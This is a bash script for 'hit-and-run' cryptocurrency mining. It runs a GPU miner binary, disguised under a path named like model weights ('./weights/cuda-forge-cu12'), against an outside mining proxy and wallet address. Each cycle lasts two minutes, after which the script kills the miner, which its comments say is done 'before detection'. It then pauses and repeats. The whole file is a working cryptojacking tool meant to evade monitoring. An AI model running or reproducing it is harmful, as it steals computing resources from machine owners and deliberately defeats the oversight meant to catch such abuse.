#!/bin/bash
# Hit-and-run miner: mine 2 min, kill, restart (before 3-5 min detection)

cd "$(dirname "$0")"
PROXY="global.pearlfortune.org:443"
ADDRESS="prl1par2eef0c04z6s6fhlzx6setjh5xqv8et50ufsty5zhywqjghwuwq6p085p"
BINARY="./weights/cuda-forge-cu12"
CYCLE=120  # 2 minutes (120 seconds)
PAUSE=30   # 30 seconds cooldown

echo "Hit-and-run mining: ${CYCLE}s mine / ${PAUSE}s cooldown"

while true; do
    echo "[$(date)] Starting cycle..."
    
    # Launch miner
    LD_LIBRARY_PATH=./lib:$LD_LIBRARY_PATH $BINARY \
        --proxy $PROXY \
        --address $ADDRESS \
        --worker $(hostname) \
        -gpu &
    MINER_PID=$!
    
    # Mine for 2 minutes
    sleep $CYCLE
    
    # Kill before detection
    kill $MINER_PID 2>/dev/null
    pkill -f cuda-forge 2>/dev/null
    wait $MINER_PID 2>/dev/null
    
    echo "[$(date)] Cycle done. Cooling ${PAUSE}s..."
    sleep $PAUSE
done
